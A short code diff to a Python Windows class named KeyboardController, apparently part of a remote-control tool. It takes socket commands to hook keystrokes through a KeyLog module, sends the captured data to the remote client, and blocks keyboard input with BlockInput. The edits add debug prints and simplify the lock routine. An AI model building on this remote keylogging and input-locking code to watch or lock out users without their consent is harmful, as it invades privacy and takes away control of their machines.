@@ -3,6 +3,7 @@ from ctypes.wintypes import DWORD, MSG
 import KeyLog
 import threading
 
+
 class KeyboardController():
     def __init__(self, clientSocket):
         self.__client = clientSocket
@@ -20,11 +21,13 @@ class KeyboardController():
                 return
         
     def startListening(self):
+        print("1")
         request = ""
         while True:
             request = self.__client.recv(1024).decode("utf-8")
             if not request:
                 break
+            print(request)
 
             if request == "hook":
                 self.hookKey()
@@ -66,8 +69,7 @@ class KeyboardController():
             self.__client.sendall(s.encode('utf-8'))
 
     def lockKeyboard(self):
-        while True:
-            windll.user32.BlockInput(True)
+        windll.user32.BlockInput(True)
 
     def unlockKeyboard(self):
         windll.user32.BlockInput(False); 
